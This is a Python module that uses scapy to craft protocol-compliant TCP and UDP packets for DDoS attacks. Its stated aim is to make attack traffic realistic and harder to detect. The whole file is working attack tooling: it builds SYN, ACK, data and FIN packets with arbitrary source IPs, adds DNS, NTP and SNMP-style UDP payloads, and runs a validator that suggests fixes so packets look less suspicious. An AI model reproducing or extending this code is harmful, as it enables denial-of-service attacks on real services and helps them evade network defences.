"""
Protocol Compliance Module for Traditional DDoS Attacks

This module ensures proper TCP/UDP protocol behavior to make attacks
more realistic and harder to detect through protocol anomalies.
"""

import random
import socket
import struct
import logging
from scapy.all import IP, TCP, UDP, Raw

# Get the centralized attack logger
attack_logger = logging.getLogger('attack_logger')


class TCPCompliance:
    """Ensures proper TCP protocol compliance for realistic attacks."""
    
    def __init__(self):
        """Initialize TCP compliance manager."""
        self.connection_states = {}
        self.sequence_numbers = {}
        self.window_sizes = {}
        
        # Realistic TCP parameters
        self.initial_window_sizes = [8192, 16384, 32768, 65535]  # Common initial window sizes
        self.mss_values = [1460, 1440, 536]  # Maximum Segment Size values
        self.window_scale_factors = [0, 1, 2, 3, 4]  # Window scaling factors
    
    def get_initial_sequence_number(self, src_ip, dst_ip, src_port, dst_port):
        """Generate realistic initial sequence number."""
        # Use connection tuple for deterministic but varied ISN
        connection_id = f"{src_ip}:{src_port}->{dst_ip}:{dst_port}"
        
        if connection_id not in self.sequence_numbers:
            # Generate ISN based on RFC 793 recommendations
            # Use a pseudo-random number based on connection details
            base_seq = hash(connection_id) % (2**32)
            # Add timestamp-based variation (simplified ISN generation)
            import time
            timestamp_factor = int(time.time() * 1000) % 10000
            isn = (base_seq + timestamp_factor) % (2**32)
            self.sequence_numbers[connection_id] = isn
        
        return self.sequence_numbers[connection_id]
    
    def get_next_sequence_number(self, connection_id, data_length=0):
        """Get next sequence number for ongoing connection."""
        if connection_id in self.sequence_numbers:
            self.sequence_numbers[connection_id] = (
                self.sequence_numbers[connection_id] + data_length
            ) % (2**32)
        else:
            self.sequence_numbers[connection_id] = random.randint(0, 2**32 - 1)
        
        return self.sequence_numbers[connection_id]
    
    def get_realistic_window_size(self, connection_id=None):
        """Get realistic TCP window size."""
        if connection_id and connection_id in self.window_sizes:
            # Simulate window size changes during connection
            current_window = self.window_sizes[connection_id]
            # Window can grow or shrink based on congestion
            change_factor = random.uniform(0.8, 1.2)
            new_window = int(current_window * change_factor)
            # Keep within realistic bounds
            new_window = max(1024, min(65535, new_window))
            self.window_sizes[connection_id] = new_window
            return new_window
        else:
            # Initial window size
            window = random.choice(self.initial_window_sizes)
            if connection_id:
                self.window_sizes[connection_id] = window
            return window
    
    def create_syn_packet(self, src_ip, dst_ip, src_port, dst_port):
        """Create a protocol-compliant SYN packet."""
        connection_id = f"{src_ip}:{src_port}->{dst_ip}:{dst_port}"
        
        # Generate realistic sequence number
        seq_num = self.get_initial_sequence_number(src_ip, dst_ip, src_port, dst_port)
        
        # Realistic window size
        window_size = self.get_realistic_window_size(connection_id)
        
        # Create TCP SYN packet with proper options
        tcp_packet = TCP(
            sport=src_port,
            dport=dst_port,
            seq=seq_num,
            ack=0,
            flags='S',  # SYN flag
            window=window_size,
            options=[
                ('MSS', random.choice(self.mss_values)),
                ('WScale', random.choice(self.window_scale_factors)),
                ('Timestamp', (random.randint(0, 2**32-1), 0)),
                ('SAckOK', '')
            ]
        )
        
        # Store connection state
        self.connection_states[connection_id] = {
            'state': 'SYN_SENT',
            'local_seq': seq_num,
            'remote_seq': 0,
            'window_size': window_size
        }
        
        return IP(src=src_ip, dst=dst_ip) / tcp_packet
    
    def create_ack_packet(self, src_ip, dst_ip, src_port, dst_port, ack_seq):
        """Create a protocol-compliant ACK packet."""
        connection_id = f"{src_ip}:{src_port}->{dst_ip}:{dst_port}"
        
        if connection_id in self.connection_states:
            state = self.connection_states[connection_id]
            seq_num = state['local_seq'] + 1
            window_size = self.get_realistic_window_size(connection_id)
        else:
            seq_num = random.randint(0, 2**32 - 1)
            window_size = random.choice(self.initial_window_sizes)
        
        tcp_packet = TCP(
            sport=src_port,
            dport=dst_port,
            seq=seq_num,
            ack=ack_seq,
            flags='A',  # ACK flag
            window=window_size
        )
        
        return IP(src=src_ip, dst=dst_ip) / tcp_packet
    
    def create_data_packet(self, src_ip, dst_ip, src_port, dst_port, data, ack_seq=0):
        """Create a protocol-compliant data packet with PSH+ACK flags."""
        connection_id = f"{src_ip}:{src_port}->{dst_ip}:{dst_port}"
        
        seq_num = self.get_next_sequence_number(connection_id, len(data))
        window_size = self.get_realistic_window_size(connection_id)
        
        tcp_packet = TCP(
            sport=src_port,
            dport=dst_port,
            seq=seq_num,
            ack=ack_seq,
            flags='PA',  # PSH+ACK flags
            window=window_size
        )
        
        return IP(src=src_ip, dst=dst_ip) / tcp_packet / Raw(load=data)
    
    def create_fin_packet(self, src_ip, dst_ip, src_port, dst_port, ack_seq=0):
        """Create a protocol-compliant FIN packet for connection termination."""
        connection_id = f"{src_ip}:{src_port}->{dst_ip}:{dst_port}"
        
        seq_num = self.get_next_sequence_number(connection_id)
        window_size = self.get_realistic_window_size(connection_id)
        
        tcp_packet = TCP(
            sport=src_port,
            dport=dst_port,
            seq=seq_num,
            ack=ack_seq,
            flags='FA',  # FIN+ACK flags
            window=window_size
        )
        
        # Clean up connection state
        if connection_id in self.connection_states:
            del self.connection_states[connection_id]
        if connection_id in self.sequence_numbers:
            del self.sequence_numbers[connection_id]
        if connection_id in self.window_sizes:
            del self.window_sizes[connection_id]
        
        return IP(src=src_ip, dst=dst_ip) / tcp_packet


class UDPCompliance:
    """Ensures proper UDP protocol compliance for realistic attacks."""
    
    def __init__(self):
        """Initialize UDP compliance manager."""
        self.port_usage = {}
        
        # Common UDP services and their typical payload patterns
        self.service_patterns = {
            53: {  # DNS
                'name': 'DNS',
                'payload_sizes': [28, 32, 64, 128, 256],
                'payloads': [
                    b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01',  # DNS query
                    b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01',
                    b'\xef\x12\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09localhost\x00\x00\x01\x00\x01'
                ]
            },
            67: {  # DHCP
                'name': 'DHCP',
                'payload_sizes': [300, 350, 400],
                'payloads': [
                    b'\x01\x01\x06\x00' + b'\x00' * 296,  # DHCP discover
                    b'\x02\x01\x06\x00' + b'\x00' * 296   # DHCP offer
                ]
            },
            123: {  # NTP
                'name': 'NTP',
                'payload_sizes': [48],
                'payloads': [
                    b'\x1b\x00\x00\x00' + b'\x00' * 44,  # NTP request
                ]
            },
            161: {  # SNMP
                'name': 'SNMP',
                'payload_sizes': [64, 128, 256],
                'payloads': [
                    b'\x30\x26\x02\x01\x00\x04\x06public\xa0\x19\x02\x04' + b'\x00' * 52,  # SNMP get
                ]
            }
        }
    
    def create_udp_packet(self, src_ip, dst_ip, src_port, dst_port, payload=None):
        """Create a protocol-compliant UDP packet."""
        if payload is None:
            # Generate realistic payload based on destination port
            payload = self.generate_realistic_payload(dst_port)
        
        udp_packet = UDP(
            sport=src_port,
            dport=dst_port
        )
        
        return IP(src=src_ip, dst=dst_ip) / udp_packet / Raw(load=payload)
    
    def generate_realistic_payload(self, dst_port):
        """Generate realistic payload based on service type."""
        if dst_port in self.service_patterns:
            pattern = self.service_patterns[dst_port]
            return random.choice(pattern['payloads'])
        else:
            # Generic payload for unknown services
            size = random.choice([32, 64, 128, 256, 512])
            # Create semi-realistic payload with some structure
            payload = b'\x00\x01\x02\x03'  # Header-like bytes
            payload += bytes([random.randint(0, 255) for _ in range(size - 4)])
            return payload
    
    def get_realistic_source_port(self):
        """Get a realistic source port number."""
        # Use ephemeral port range (32768-65535 on Linux)
        return random.randint(32768, 65535)


class ProtocolValidator:
    """Validates protocol compliance and provides enhancement suggestions."""
    
    def __init__(self):
        """Initialize protocol validator."""
        self.tcp_compliance = TCPCompliance()
        self.udp_compliance = UDPCompliance()
    
    def validate_tcp_packet(self, packet):
        """
        Validate TCP packet compliance.
        
        Args:
            packet: Scapy packet to validate
            
        Returns:
            dict: Validation results with compliance score and suggestions
        """
        if not packet.haslayer(TCP):
            return {'valid': False, 'reason': 'Not a TCP packet'}
        
        tcp_layer = packet[TCP]
        issues = []
        suggestions = []
        
        # Check sequence number validity
        if tcp_layer.seq == 0 and 'S' not in tcp_layer.flags:
            issues.append('Invalid sequence number (0) for non-SYN packet')
            suggestions.append('Use realistic sequence numbers')
        
        # Check window size
        if tcp_layer.window == 0:
            issues.append('Zero window size may indicate abnormal behavior')
            suggestions.append('Use realistic window sizes (1024-65535)')
        
        # Check flag combinations
        flags = tcp_layer.flags
        if 'S' in flags and 'A' in flags and tcp_layer.ack == 0:
            issues.append('SYN+ACK packet with zero ACK field')
            suggestions.append('Ensure proper ACK field for SYN+ACK packets')
        
        # Check TCP options for SYN packets
        if 'S' in flags and not tcp_layer.options:
            issues.append('SYN packet without TCP options is suspicious')
            suggestions.append('Add realistic TCP options (MSS, WScale, etc.)')
        
        compliance_score = max(0.0, 1.0 - (len(issues) * 0.2))
        
        return {
            'valid': len(issues) == 0,
            'compliance_score': compliance_score,
            'issues': issues,
            'suggestions': suggestions
        }
    
    def validate_udp_packet(self, packet):
        """
        Validate UDP packet compliance.
        
        Args:
            packet: Scapy packet to validate
            
        Returns:
            dict: Validation results with compliance score and suggestions
        """
        if not packet.haslayer(UDP):
            return {'valid': False, 'reason': 'Not a UDP packet'}
        
        udp_layer = packet[UDP]
        issues = []
        suggestions = []
        
        # Check port numbers
        if udp_layer.sport == udp_layer.dport:
            issues.append('Source and destination ports are identical')
            suggestions.append('Use different source and destination ports')
        
        # Check payload presence for certain services
        if udp_layer.dport in [53, 67, 123, 161] and not packet.haslayer(Raw):
            issues.append(f'Missing payload for service port {udp_layer.dport}')
            suggestions.append('Add service-appropriate payload')
        
        # Check payload size reasonableness
        if packet.haslayer(Raw):
            payload_len = len(packet[Raw].load)
            if payload_len > 1472:  # MTU considerations
                issues.append('Payload size may cause fragmentation')
                suggestions.append('Consider smaller payload sizes')
        
        compliance_score = max(0.0, 1.0 - (len(issues) * 0.25))
        
        return {
            'valid': len(issues) == 0,
            'compliance_score': compliance_score,
            'issues': issues,
            'suggestions': suggestions
        }
    
    def enhance_packet_compliance(self, packet_type, src_ip, dst_ip, src_port, dst_port, **kwargs):
        """
        Create a protocol-compliant packet with enhancements.
        
        Args:
            packet_type: 'tcp_syn', 'tcp_ack', 'tcp_data', 'udp'
            src_ip, dst_ip: IP addresses
            src_port, dst_port: Port numbers
            **kwargs: Additional parameters (data, ack_seq, etc.)
            
        Returns:
            Enhanced packet with proper protocol compliance
        """
        if packet_type == 'tcp_syn':
            return self.tcp_compliance.create_syn_packet(src_ip, dst_ip, src_port, dst_port)
        elif packet_type == 'tcp_ack':
            ack_seq = kwargs.get('ack_seq', 0)
            return self.tcp_compliance.create_ack_packet(src_ip, dst_ip, src_port, dst_port, ack_seq)
        elif packet_type == 'tcp_data':
            data = kwargs.get('data', b'')
            ack_seq = kwargs.get('ack_seq', 0)
            return self.tcp_compliance.create_data_packet(src_ip, dst_ip, src_port, dst_port, data, ack_seq)
        elif packet_type == 'tcp_fin':
            ack_seq = kwargs.get('ack_seq', 0)
            return self.tcp_compliance.create_fin_packet(src_ip, dst_ip, src_port, dst_port, ack_seq)
        elif packet_type == 'udp':
            payload = kwargs.get('payload', None)
            return self.udp_compliance.create_udp_packet(src_ip, dst_ip, src_port, dst_port, payload)
        else:
            raise ValueError(f"Unsupported packet type: {packet_type}")